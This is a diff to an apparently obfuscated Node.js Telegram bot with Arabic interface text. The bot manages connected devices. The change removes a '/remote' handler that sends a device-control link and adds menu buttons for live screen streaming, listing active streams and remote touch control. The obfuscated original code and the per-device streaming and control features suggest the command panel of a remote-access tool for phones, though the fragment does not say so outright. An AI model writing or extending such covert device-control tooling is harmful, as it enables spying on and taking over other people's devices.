@@ -1110,29 +1110,6 @@ bot.onText(/\/streams/, (msg) => {
     }
 });
 
-bot.onText(/\/remote (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    const deviceId = match[1];
-    
-    if (activeStreams.has(deviceId)) {
-        const stream = activeStreams.get(deviceId);
-        const streamUrl = `http://${os.hostname()}:3000/control/${deviceId}`;
-        
-        bot.sendMessage(chatId, 
-            `🖱️ <b>التحكم عن بعد - الجهاز ${deviceId}</b>\n\n` +
-            `🌐 <b>رابط التحكم:</b>\n` +
-            `<code>${streamUrl}</code>\n\n` +
-            `📱 <b>تعليمات:</b>\n` +
-            `• انقر على الشاشة للتحكم باللمس\n` +
-            `• استخدم الأزرار للسحب والضغط الطويل\n` +
-            `• حرك الماوس لمشاهدة الإحداثيات`,
-            { parse_mode: 'HTML' }
-        );
-    } else {
-        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل للبث`, { parse_mode: 'HTML' });
-    }
-});
-
 // بداية الكود الأصلي
 app[_0x286428(0x214)]('/', (_0x475404, _0x364a1f) => {
     const _0x4afaa0 = _0x286428, _0x30b554 = { 'VqrFV': _0x4afaa0(0x326) + _0x4afaa0(0x2f1) + _0x4afaa0(0x3aa) + _0x4afaa0(0x2c9) };
@@ -1215,10 +1192,31 @@ app[_0x286428(0x214)]('/', (_0x475404, _0x364a1f) => {
                     'text': _0x2162d1[_0x3c5d98(0x298)],
                     'callback_data': _0x5b8386
                 }), _0x520b32[_0x3c5d98(0x278)](_0x41751b), _0x41751b = []);
-        }), _0x520b32[_0x5acb82(0x278)]([{
-                'text': _0x25dd5e[_0x5acb82(0x31f)],
-                'callback_data': _0x444e7d + _0x5acb82(0x3a0)
-            }]), bot[_0x5acb82(0x369) + 'e'](data['id'], _0x5acb82(0x27b) + _0x5acb82(0x3b7) + _0x5acb82(0x316) + _0x5acb82(0x20d) + _0x444e7d + _0x5acb82(0x2f9), {
+        });
+        
+        // ===== إضافة الأزرار الجديدة هنا =====
+        // إضافة أزرار البث المباشر إلى القائمة
+        _0x520b32.push([
+            {
+                text: '📺 بث مباشر',
+                callback_data: _0x444e7d + '|live'
+            },
+            {
+                text: '📡 البثوث النشطة',
+                callback_data: _0x444e7d + '|streams'
+            }
+        ]);
+        
+        _0x520b32.push([{
+            text: '🖱️ تحكم عن بعد',
+            callback_data: _0x444e7d + '|remote'
+        }]);
+        // ===== نهاية إضافة الأزرار الجديدة =====
+        
+        _0x520b32.push([{
+            'text': _0x25dd5e[_0x5acb82(0x31f)],
+            'callback_data': _0x444e7d + _0x5acb82(0x3a0)
+        }]), bot[_0x5acb82(0x369) + 'e'](data['id'], _0x5acb82(0x27b) + _0x5acb82(0x3b7) + _0x5acb82(0x316) + _0x5acb82(0x20d) + _0x444e7d + _0x5acb82(0x2f9), {
             'reply_markup': { 'inline_keyboard': _0x520b32 },
             'parse_mode': _0x25dd5e[_0x5acb82(0x3e6)]
         });
